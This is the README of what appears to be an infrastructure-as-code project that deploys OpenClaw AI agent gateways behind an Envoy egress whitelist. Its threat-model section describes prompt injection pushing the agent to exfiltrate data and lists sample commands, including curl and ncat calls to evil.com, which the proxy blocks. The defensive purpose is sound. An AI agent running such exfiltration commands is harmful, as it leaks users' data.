# openclaw-deploy

[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
[![Pulumi](https://img.shields.io/badge/Pulumi-IaC-8A3391?logo=pulumi&logoColor=white)](https://www.pulumi.com)
[![OpenClaw](https://img.shields.io/badge/OpenClaw-supported-6E56CF)](https://docs.openclaw.ai)
[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/schmitthub/openclaw-docker)

Pulumi TypeScript IaC that provisions remote VPS hosts and deploys [OpenClaw](https://openclaw.ai) gateway fleets with network-level egress isolation via Envoy proxy and Tailscale networking.

> Early development — features and conventions may change. Contributions and feedback welcome!

## Table of Contents

- [openclaw-deploy](#openclaw-deploy)
  - [Table of Contents](#table-of-contents)
  - [Architecture](#architecture)
  - [Threat Model](#threat-model)
  - [Prerequisites](#prerequisites)
  - [Quickstart](#quickstart)
  - [Stack Configuration](#stack-configuration)
  - [Component Hierarchy](#component-hierarchy)
  - [Egress Domain Whitelist](#egress-domain-whitelist)
  - [Experimental Runtime Binary Persistence](#experimental-runtime-binary-persistence)
  - [Try it: Deploy OpenClaw with private Discord server access](#try-it-deploy-openclaw-with-private-discord-server-access)
    - [1) Register accounts and create API credentials](#1-register-accounts-and-create-api-credentials)
    - [2) Prepare your Pulumi stack](#2-prepare-your-pulumi-stack)
    - [3) Set provider + secret config in Pulumi](#3-set-provider--secret-config-in-pulumi)
    - [4) Stack config shape (sanitized example)](#4-stack-config-shape-sanitized-example)
    - [5) Deploy and verify](#5-deploy-and-verify)
    - [6) Post-deploy operational notes](#6-post-deploy-operational-notes)
  - [Common Operations](#common-operations)
  - [Development](#development)
  - [Repository Structure](#repository-structure)

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│  Remote VPS (Hetzner / DigitalOcean / Oracle Cloud)                 │
│                                                                     │
│   ┌─────────────────────────────────────────────────────────────┐   │
│   │  openclaw-internal network (internal: true, 172.28.0.0/24)  │   │
│   │  No default route to internet                               │   │
│   │                                                             │   │
│   │   ┌───────────────────────────────────┐                     │   │
│   │   │  openclaw-gateway-<profile>       │                     │   │
│   │   │  • OpenClaw + pnpm + bun + brew   │                     │   │
│   │   │  • ttyd + filebrowser (web tools) │                     │   │
│   │   │  • Tailscale (in-container)       │                     │   │
│   │   │    → Serve: /shell, /files,       │                     │   │
│   │   │      /openclaw (ingress)          │                     │   │
│   │   │  • dns: [172.28.0.2] (Envoy)      │                     │   │
│   │   │                                   │                     │   │
│   │   │  entrypoint.sh (root, immutable): │                     │   │
│   │   │  ┌─────────────────────────────┐  │                     │   │
│   │   │  │ ip route default via Envoy  │  │                     │   │
│   │   │  │ NAT: SSH/TCP → DNAT :10001+ │  │                     │   │
│   │   │  │ NAT: UDP → DNAT :10100+     │  │                     │   │
│   │   │  │ NAT: ALL TCP → DNAT :10000  │  │                     │   │
│   │   │  │ FILTER: OUTPUT DROP default │  │                     │   │
│   │   │  │ tailscaled (userspace)      │  │                     │   │
│   │   │  │ gosu → drops to node user   │  │                     │   │
│   │   │  └─────────────────────────────┘  │                     │   │
│   │   └───────────────────────────────────┘                     │   │
│   │              ... (N gateways per server)                    │   │
│   │                                                             │   │
│   │                  ┌──────────────────────────┐               │   │
│   │    Internet ◄──► │  Envoy (172.28.0.2)      │               │   │
│   │   (whitelisted   │                          │               │   │
│   │    domains only) │  TLS (:10000):           │               │   │
│   │                  │  • TLS Inspector (SNI)   │               │   │
│   │    Cloudflare    │  • Domain whitelist      │               │   │
│   │    1.1.1.2 ◄──   │  • MITM inspection (opt) │               │   │
│   │    1.0.0.2       │                          │               │   │
│   │                  │  SSH/TCP (:10001+):      │               │   │
│   │                  │  • Per-rule tcp_proxy    │               │   │
│   │                  │  • STRICT_DNS / STATIC   │               │   │
│   │                  │                          │               │   │
│   │                  │  UDP (:10100+):          │               │   │
│   │                  │  • Per-rule udp_proxy    │               │   │
│   │                  │  • Tailscale DERP STUN   │               │   │
│   │                  │                          │               │   │
│   │                  │  DNS (:53 UDP):          │               │   │
│   │                  │  • → Cloudflare (malware │               │   │
│   │                  │    blocking resolvers)   │               │   │
│   │                  └──────────────────────────┘               │   │
│   └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│   Docker daemon (provisioned by HostBootstrap)                      │
└─────────────────────────────────────────────────────────────────────┘

Operator machine:
  $ pulumi up --stack dev     # provisions server + deploys everything
  $ pulumi destroy --stack dev  # tears down
```

One Pulumi stack = one server. Each server runs N gateway instances sharing a single Envoy egress proxy. Tailscale runs inside each gateway container and handles all ingress (Serve for private tailnet access, Funnel for public webhooks). No self-managed TLS certificates or reverse proxies.

Gateway containers now also mount the OpenClaw runtime home and Linuxbrew data paths as named Docker volumes so runtime-installed binaries can persist across container recreation. This is intentionally experimental and trades container purity for operational flexibility while we validate real-world behavior.

## Threat Model

**Threat:** Prompt injection coerces the AI agent into exfiltrating data. The agent can run any tool available in the container — `curl`, `wget`, `ncat`, `ssh`, raw sockets, subprocesses. It can use any port, any protocol, and target any destination. Application-level proxy settings (`HTTP_PROXY`) are trivially bypassed.

**Defense-in-depth (five layers):**

| Layer                                 | Mechanism                                                                       | What it stops                                         | Bypassable by `node` user?                          |
| ------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------- | --------------------------------------------------- |
| **1. Network isolation**              | Docker `internal: true` network                                                 | No default route to internet — no IP to reach         | No                                                  |
| **2. iptables DNAT + FILTER**         | Root-owned rules: SSH/TCP → specific Envoy ports, all other TCP → Envoy:10000   | Every TCP connection goes through Envoy               | No (`CAP_NET_ADMIN` required, root only)            |
| **3. Envoy protocol-aware whitelist** | TLS: SNI inspection + domain whitelist. SSH/TCP: per-rule port-mapped listeners | Non-whitelisted HTTPS, non-mapped SSH/TCP, plain HTTP | No (Envoy resolves DNS independently)               |
| **4. Egress policy engine**           | Typed `EgressRule[]` with domain/IP + protocol support (TLS, SSH, TCP)          | Structured policy control with per-protocol handling  | No (Envoy config, not in container)                 |
| **5. Malware-blocking DNS**           | Cloudflare 1.1.1.2 / 1.0.0.2 via Envoy DNS listener                             | Known malware, phishing, and C2 domains               | No (Envoy resolves DNS, containers cannot override) |

**Why SNI spoofing doesn't work:** If an attacker forges the SNI to `api.anthropic.com` while connecting to `evil.com`'s IP, Envoy resolves `api.anthropic.com` via DNS independently and connects to the **real** IP — not the attacker's server.

**What gets blocked / allowed:**

- `curl https://evil.com` — SNI not in whitelist → **BLOCKED**
- `ssh user@evil.com` — no SSH egress rule configured → **BLOCKED**
- `ssh git@github.com` — SSH rule with port 22 in egressPolicy → **ALLOWED** (via dedicated Envoy listener)
- `ncat evil.com 4444` — no matching TCP rule → **BLOCKED**
- `python3 -c "import socket; s.connect(('1.2.3.4', 443))"` — no SNI → **BLOCKED**
- `curl https://api.anthropic.com` — SNI matches whitelist → **ALLOWED**

## Prerequisites

- [Node.js](https://nodejs.org/) (v18+)
- [Pulumi CLI](https://www.pulumi.com/docs/install/)
- [Tailscale](https://tailscale.com/) account with an auth key
- A VPS provider account with an SSH key uploaded: [Hetzner Cloud](https://www.hetzner.com/cloud), [DigitalOcean](https://www.digitalocean.com/), or [Oracle Cloud](https://www.oracle.com/cloud/)

## Quickstart

```bash
# Clone and install
git clone https://github.com/schmitthub/openclaw-docker.git openclaw-deploy
cd openclaw-deploy
npm install

# Initialize a stack
pulumi stack init dev
cp Pulumi.dev.yaml.example Pulumi.dev.yaml

# Set required secrets
pulumi config set --secret tailscaleAuthKey <your-tailscale-auth-key>

# Edit Pulumi.dev.yaml with your server config, egress policy, and gateway profiles

# Deploy
pulumi up
```

`pulumi up` will:

1. Provision a VPS (Hetzner, DigitalOcean, or Oracle Cloud)
2. Install Docker + fail2ban on the host
3. Create Docker networks + deploy Envoy egress proxy
4. Build gateway Docker images and deploy containers
5. Configure each gateway via ephemeral init container
6. Tailscale Serve configured inside each gateway container at startup

## Stack Configuration

Configuration lives in `Pulumi.<stack>.yaml`. See `Pulumi.dev.yaml.example` for a complete example.

| Key                          | Type                                          | Required | Description                                        |
| ---------------------------- | --------------------------------------------- | -------- | -------------------------------------------------- |
| `provider`                   | `"hetzner"` \| `"digitalocean"` \| `"oracle"` | yes      | VPS provider                                       |
| `serverType`                 | string                                        | yes      | Server type (e.g. `cx22`, `cax21`)                 |
| `region`                     | string                                        | yes      | Datacenter region (e.g. `fsn1`)                    |
| `sshKeyId`                   | string                                        | no       | SSH key ID at provider (auto-generated if omitted) |
| `tailscaleAuthKey`           | secret                                        | yes      | One-time Tailscale auth key                        |
| `egressPolicy`               | `EgressRule[]`                                | yes      | User egress rules (additive to hardcoded)          |
| `gateways`                   | `GatewayConfig[]`                             | yes      | Gateway profile definitions (1+)                   |
| `gatewayToken-<profile>`     | secret                                        | no       | Auth token override (auto-generated if omitted)    |
| `gatewaySecretEnv-<profile>` | secret                                        | no       | JSON `{"KEY":"value"}` env vars for init + runtime |

**Gateway profile fields:**

| Field            | Type        | Description                                                     |
| ---------------- | ----------- | --------------------------------------------------------------- |
| `profile`        | string      | Unique name (used in resource names)                            |
| `version`        | string      | OpenClaw version (`latest` or semver)                           |
| `port`           | number      | Gateway port (e.g. `18789`)                                     |
| `installBrowser` | boolean     | Bake Playwright + Chromium (~300MB)                             |
| `imageSteps`     | ImageStep[] | Custom Dockerfile RUN instructions (`{run}` pairs, always root) |
| `setupCommands`  | string[]    | OpenClaw subcommands run in init container (e.g. `onboard`)     |
| `env`            | object      | Extra environment variables                                     |

## Component Hierarchy

Components compose sequentially — each depends on the previous:

```
Server (VPS provisioning: Hetzner / DigitalOcean / Oracle)
  ↓ connection (public IP SSH)
HostBootstrap (Docker + fail2ban install)
  ↓ dockerHost (public IP SSH)
EnvoyEgress (Docker networks + Envoy container)
  ↓ internalNetworkName
Gateway(s) (1+ OpenClaw instances per server)
  ↓ Tailscale inside container (Serve/Funnel)
```

| Component       | Pulumi Type                    | Provider                             | Purpose                                                                  |
| --------------- | ------------------------------ | ------------------------------------ | ------------------------------------------------------------------------ |
| `Server`        | `openclaw:infra:Server`        | `@pulumi/hcloud` / DO / OCI          | Provision VPS, expose IP + SSH connection                                |
| `HostBootstrap` | `openclaw:infra:HostBootstrap` | `@pulumi/command`                    | Install Docker + fail2ban on bare host                                   |
| `EnvoyEgress`   | `openclaw:infra:EnvoyEgress`   | `@pulumi/docker` + `@pulumi/command` | Create networks, deploy Envoy                                            |
| `Gateway`       | `openclaw:app:Gateway`         | `@pulumi/docker` + `@pulumi/command` | Build image, deploy container, configure gateway, Tailscale in container |

## Egress Domain Whitelist

Envoy enforces protocol-aware egress filtering: TLS connections are filtered by SNI whitelist, SSH/TCP connections are forwarded via per-rule dedicated listeners, and all other traffic is denied.

**Always included (hardcoded, cannot be removed):**

| Category       | Domains                                                                                                                                                                                      |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Infrastructure | `clawhub.com`, `registry.npmjs.org`                                                                                                                                                          |
| AI providers   | `api.anthropic.com`, `api.openai.com`, `generativelanguage.googleapis.com`, `openrouter.ai`, `api.x.ai`                                                                                      |
| Homebrew       | `github.com`, `*.githubusercontent.com`, `ghcr.io`, `formulae.brew.sh`                                                                                                                       |
| Tailscale      | `tailscale.com`, `login.tailscale.com`, `controlplane.tailscale.com`, `log.tailscale.com`, `derp1–28.tailscale.com`, `*.api.letsencrypt.org` (TLS); `derp1–28.tailscale.com` (UDP STUN 3478) |

User-defined `egressPolicy` rules are **additive** — hardcoded domains are always present. Duplicates are deduplicated by `mergeEgressPolicy()`.

```yaml
# Example: TLS domains, SSH access, and TCP database
openclaw-deploy:egressPolicy:
  - dst: "discord.com"
    proto: tls
    action: allow
  - dst: "gateway.discord.gg"
    proto: tls
    action: allow
  - dst: "cdn.discordapp.com"
    proto: tls
    action: allow
  - dst: "github.com"
    proto: ssh
    port: 22
    action: allow
  - dst: "db.example.com"
    proto: tcp
    port: 5432
    action: allow
```

SSH/TCP rules use per-rule port mapping: each rule gets a dedicated Envoy listener port (starting from 10001), and destination-specific iptables DNAT rules in the gateway entrypoint route matching traffic to the correct port. Domain resolution happens at container startup.

## Experimental Runtime Binary Persistence

This project currently uses a non-standard, intentionally experimental container pattern to support runtime binary installs:

- The gateway creates a persistent named volume OpenClaw user home (`/home/node`).
- The gateway creates a persistent named volume for Linuxbrew data (`/home/linuxbrew/.linuxbrew`).

Why this exists: I want to test whether persistent user-space runtime installs (pnpm/brew/uv/etc.) are practical for gateway operations.

Why this is experimental: it is admittedly ugly and goes against normal immutable-container conventions. It is included deliberately while I evaluate the trade-offs.

Operational notes:

- On first run, Tailscale will register your gateway and assign it a random tailnet domain on your tailscale network. It can always be found in the Tailscale admin console. This domain changes every time you rebuild the stack or recreate the gateway container (stopping/restarting does not change it).
- Gateway is not a daemon supervisor process; after installing a new binary, restart is required for predictable runtime behavior.
- From the host, you can SSH into the VPS host and restart with Docker (`docker restart openclaw-gateway-<profile>`) (ssh key is stored in Pulumi), or from inside the web shell run `kill 1` as root.
- Due to strict UDP egress lockdown, Tailscale SSH is extremely slow.
- For day-to-day remote access we expose web tools over Tailscale Serve on loopback endpoints:
  - `<device_tailnetdomain>.ts.net/shell` for web terminal access
  - `<device_tailnetdomain>.ts.net/files` for web file browser access
- When adding new binaries interactively, use the webshell and run `kill 1` as root to restart the gateway container.

Runtime install workflow (example):

1. Open the controlui `<device_tailnetdomain>.ts.net/openclaw` skills area and install deps for skills (or use the webshell and `su - node` to install as gateway's user)
2. Install your runtime binary using the package manager of choice (for example via `brew`, `pnpm`, or `uv`).
3. In `<device_tailnetdomain>.ts.net/shell` as root (default) and run `kill 1`.
4. Open the controlui `<device_tailnetdomain>.ts.net/openclaw` and verify it notices the binary.

Because `/home/node` and `/home/linuxbrew/.linuxbrew` are persistent named volumes, installed binaries and package-manager state persist across container restarts/recreation.

## Try it: Deploy OpenClaw with private Discord server access

This is a very unfriendly end-to-end guide for deploying a VPS server [for just you and the claw to chat on a private discord server you create across multiple channels](https://docs.openclaw.ai/channels/discord#quick-setup). I recommend a Hetzner stack since its all I've tested end to end (as of this writing I haven't tested Digital Ocean at all, should be ready in a day or two. OCI never has free tier available). You should probably clone or fork, but I've gitignored `Pulumi.*.yaml` so it should be safe for locally screwing around, and `pre-commit` will block secrets if you install it and try to commit (mostly).

If you are able to struggle through this without losing your sanity, you should be in a good position to customize the deployment for your own use case. And you'll have a nicely deployed locked down openclaw in about 10 mins without doing anything but waiting for it to connect to your discord channel.

Once it does I recommend using this guide to onboard and configure it [https://amankhan1.substack.com/p/how-to-make-your-openclaw-agent-useful](https://amankhan1.substack.com/p/how-to-make-your-openclaw-agent-useful)

But as per that guide at the very least your first message to the bot should be:

- "Hey, let’s get you set up. Read BOOTSTRAP.md and walk me through it." To get it onboarded with you followed by...
- “When I ask questions in Discord channels, use memory_search or memory_get if you need long-term context from MEMORY.md.”

As I iron out the kinks and rough edges, I will update this guide to be more user-friendly. But in all fairness OpenClaw itself is very diffuclt to set up, its documentation rarely is fully accurate, and I had to resort to cloning locally and letting a claude code agent analyze it with Serena LSP to figure out the code paths and actual settings and constraints, there are actually many bugs and gotchas in OpenClaw. Disclaimer: I don't blame the maintainers for this is in the new era of AI generate code adding 1000s of lines a second, and its a massive project I had an anxiety attack just looking at the amount of PRs they have to deal with...

OpenClaw platform references:

- Hetzner (tested, recommended): <https://docs.openclaw.ai/install/hetzner>
- DigitalOcean (untested, you can try it): <https://docs.openclaw.ai/platforms/digitalocean>
- Oracle (tested, but free-tier capacity is often unavailable): <https://docs.openclaw.ai/platforms/oracle>

### 1) Register accounts and create API credentials

1. **Hetzner Cloud**
   - Create a Hetzner Cloud project.
   - Create a project API token with write access.
   - Keep the token for `hcloud:token` Pulumi config.
   - OpenClaw reference: <https://docs.openclaw.ai/install/hetzner>

2. **Discord Developer Portal**
   - Go to the Discord Developer Portal and create an application.
   - Add a Bot user for the app and copy the bot token.
   - Under **Bot**, enable privileged intents your workflow requires (commonly Message Content Intent).
   - Under **OAuth2 → URL Generator**, select `bot` scope and required bot permissions, then invite the bot to your private Discord server.
   - OpenClaw reference: <https://docs.openclaw.ai/channels/discord#quick-setup>
   - Stop at the point where the app is created and added to your private server; Pulumi + `setupCommands` handle the remaining gateway-side setup.

3. **Discord IDs (server + user allowlist values)**
   - In Discord client settings, enable **Developer Mode**.
   - Right-click your private server → **Copy Server ID** (`DISCORD_SERVER_ID`).
   - Right-click your own Discord user/profile → **Copy User ID** (`DISCORD_USER_ID`).

4. **Tailscale**
   - Create/login to a Tailscale account.
   - Install Tailscale CLI on your operator machine and run `tailscale up`.
   - In Tailscale admin, create a tag for these gateways under access controls > tags (e.g. `tag:openclaw`).
   - In Tailscale admin, under settings > keys, create a reusable-ephemeral auth key for automated node registration and have it apply the tag you created.
   - Enable HTTPS certificates in the DNS settings.
   - OpenClaw reference: <https://docs.openclaw.ai/gateway/tailscale#tailscale-prerequisites-+-limits>

5. **OpenRouter**
   - Create an OpenRouter API key for gateway auth/model access (`OPENROUTER_API_KEY`).

6. **Brave Search API**
   - Create a Brave Search API key (`BRAVE_API_KEY`).
   - OpenClaw reference: <https://docs.openclaw.ai/brave-search#brave-search>

### 2) Prepare your Pulumi stack

Create and use a Pulumi account first:

- Create a Pulumi **individual** account (free tier is enough for this project).
- Install Pulumi CLI and authenticate from your operator machine.

```bash
# From repo root
npm install

# Login to Pulumi backend (first time)
pulumi login

# Create/select stack
pulumi stack init openclaw-ref || true
pulumi stack select openclaw-ref
```

Then use the commands below and the sample stack config shape in this README.

### 3) Set provider + secret config in Pulumi

Set provider credential and deployment secrets via Pulumi config (not plaintext YAML):

```bash
# Hetzner provider token
pulumi config set --stack openclaw-ref --secret hcloud:token "<HETZNER_API_TOKEN>"

# Tailscale auth key used inside the gateway container
pulumi config set --stack openclaw-ref --secret tailscaleAuthKey "<TAILSCALE_AUTH_KEY>"

# Secret env passed to setupCommands and runtime container env
pulumi config set --stack openclaw-ref --secret gatewaySecretEnv-openclaw-ref '{
  "OPENROUTER_API_KEY":"<OPENROUTER_API_KEY>",
  "BRAVE_API_KEY":"<BRAVE_API_KEY>",
  "DISCORD_BOT_TOKEN":"<DISCORD_BOT_TOKEN>",
  "DISCORD_USER_ID":"<DISCORD_USER_ID>",
  "DISCORD_SERVER_ID":"<DISCORD_SERVER_ID>"
}'
```

### 4) Stack config shape (sanitized example)

Use this as a safe template for `Pulumi.openclaw-ref.yaml` (no real secrets):

```yaml
config:
  openclaw-deploy:provider: hetzner
  openclaw-deploy:serverType: cx23
  openclaw-deploy:region: nbg1
  openclaw-deploy:egressPolicy: '[{"action":"allow","dst":"discord.com","proto":"tls"},{"action":"allow","dst":"gateway.discord.gg","proto":"tls"},{"action":"allow","dst":"cdn.discordapp.com","proto":"tls"},{"action":"allow","dst":"proxy.golang.org","proto":"tls"},{"action":"allow","dst":"sum.golang.org","proto":"tls"},{"action":"allow","dst":"storage.googleapis.com","proto":"tls"}]'
  openclaw-deploy:gateways:
    - profile: openclaw-ref
      version: latest
      port: 18789
      installBrowser: true
      setupCommands:
        - >-
          onboard --non-interactive --tailscale serve --accept-risk --mode local --gateway-bind loopback --gateway-token "$OPENCLAW_GATEWAY_TOKEN" --no-install-daemon --auth-choice openrouter-api-key --openrouter-api-key "$OPENROUTER_API_KEY" --skip-channels --skip-skills --skip-daemon --skip-health
        - config set gateway.controlUi.dangerouslyAllowHostHeaderOriginFallback true # Ugly hack due to bugs. its safe because you are behind a private tailnet and the gateway token is secret, but ideally this wouldn't be necessary.
        - config set gateway.auth.allowTailscale false # Ugly hack due to openclaw bugs
        - config set gateway.controlUi.dangerouslyDisableDeviceAuth true # Ugly hack due to openclaw bugs. its mitigated because you are behind a private tailnet and the gateway token is secret, but ideally this wouldn't be necessary.
        - config set tools.profile full # this is going to give it the kitchen sink of power. you can change from full to other profiles if you want https://docs.openclaw.ai/tools#tool-profiles-base-allowlist
        - config set gateway.controlUi.basePath /openclaw
        - config set skills.install.nodeManager pnpm
        - config set agents.defaults.memorySearch.provider openai
        - 'config set agents.defaults.memorySearch.remote.baseUrl "https://openrouter.ai/api/v1"'
        - 'config set agents.defaults.memorySearch.remote.apiKey "{"source":"env","provider":"default","id":"OPENROUTER_API_KEY"}"'
        - config set agents.defaults.memorySearch.model "openai/text-embedding-3-small"
        - config set tools.web.search.provider brave
        - 'config set tools.web.search.apiKey "{"source":"env","provider":"default","id":"BRAVE_API_KEY"}"'
        - 'config set channels.discord.token "{"source":"env","provider":"default","id":"DISCORD_BOT_TOKEN"}"'
        - 'config set channels.discord.allowFrom "["$DISCORD_USER_ID"]"'
        - config set channels.discord.dmPolicy allowlist
        - config set channels.discord.groupPolicy allowlist
        - 'config set channels.discord.guilds "{"$DISCORD_SERVER_ID": {"users": ["$DISCORD_USER_ID"], "requireMention": false}}"'
```

Note: the secret values (`hcloud:token`, `tailscaleAuthKey`, `gatewaySecretEnv-openclaw-ref`, optional `gatewayToken-openclaw-ref`) are set with `pulumi config set --secret` and should not be committed as plaintext and vary by provider.

### 5) Deploy and verify

```bash
pulumi preview --stack openclaw-ref
pulumi up --stack openclaw-ref

# Show stack outputs (gateway URLs are secret outputs)
pulumi stack output --stack openclaw-ref
pulumi stack output --stack openclaw-ref --show-secrets
pulumi stack output gatewayServices --show-secrets # this will show you your tailnet hostname and required gateway token querystring to authorize control ui, and provide links to your webshell and file browser
```

After deploy, check the output for your tailnet hostname and links to view your services. There is a slight delay when initially connecting because Tailscale needs to generate an SSL certificate for the domain. Be patient — it can take up to 10-20 seconds. (You need to enable HTTPS in Tailscale; see the docs.) On first run, Tailscale will register your gateway and assign it a random tailnet domain. This domain changes every time you rebuild the stack or recreate the gateway container (stopping/restarting does not change it).

- `<device_tailnetid>.ts.net/openclaw` for Control UI (needs the token querystring for the first connection to trust your device)
- `<device_tailnetid>.ts.net/shell` for web terminal
- `<device_tailnetid>.ts.net/files` for web file browser

### 6) Post-deploy operational notes

- If you install new runtime binaries run `kill 1` as root in `/shell`. It forces the container to restart. You can't use openclaw commands to do this because we aren't running as a daemon.
- Tailscale SSH is extremely slow due to the strict UDP egress lockdown (leaving the port open is an easy exfiltration highway, so I downgrade attempts to HTTPS and only for tailscale domains trying UDP); `/shell` and `/files` services are the intended low-friction operational path and are only running on localhost in the container and exposed through your tailnet auth.

## Common Operations

```bash
# Deploy / update
pulumi up --stack dev

# Preview changes without applying
pulumi preview --stack dev

# View stack outputs (server IP, Tailscale IP, gateway URLs)
pulumi stack output --stack dev

# Tear down everything
pulumi destroy --stack dev

# View gateway logs (via SSH)
ssh root@<server-ip> docker logs -f openclaw-gateway-personal

# Restart a gateway after config changes
ssh root@<server-ip> docker restart openclaw-gateway-personal

# Run an openclaw CLI command inside a gateway container
ssh root@<server-ip> docker exec openclaw-gateway-personal openclaw config get gateway
```

## Development

```bash
npm install                # install dependencies
npx tsc --noEmit           # type-check
npx vitest run             # run all tests
npx vitest run tests/envoy.test.ts  # run a specific test
npm run check              # typecheck + test
```

## Repository Structure

```
index.ts                    # Stack composition entry point
Pulumi.yaml                 # Pulumi project metadata
Pulumi.dev.yaml.example     # Example stack config
components/
  index.ts                  # Re-exports
  server.ts                 # VPS provisioning (Hetzner / DigitalOcean / Oracle)
  bootstrap.ts              # Docker + fail2ban install on bare host
  envoy.ts                  # Egress proxy: networks + Envoy container
  gateway.ts                # OpenClaw gateway instance + config + Tailscale
config/
  index.ts                  # Re-exports
  types.ts                  # EgressRule, VpsProvider, GatewayConfig, StackConfig
  domains.ts                # Hardcoded egress rules + mergeEgressPolicy()
  defaults.ts               # Constants (networks, ports, images, packages)
templates/
  index.ts                  # Re-exports
  dockerfile.ts             # Renders Dockerfile (node:22-bookworm + tools)
  entrypoint.ts             # Renders entrypoint.sh (iptables + gosu)
  envoy.ts                  # Renders envoy.yaml (egress-only proxy + DNS)
tests/
  config.test.ts            # Config types and domain merging
  templates.test.ts         # Dockerfile/entrypoint rendering
  envoy.test.ts             # Envoy config rendering
  components.test.ts        # Pulumi components (mocked)
```
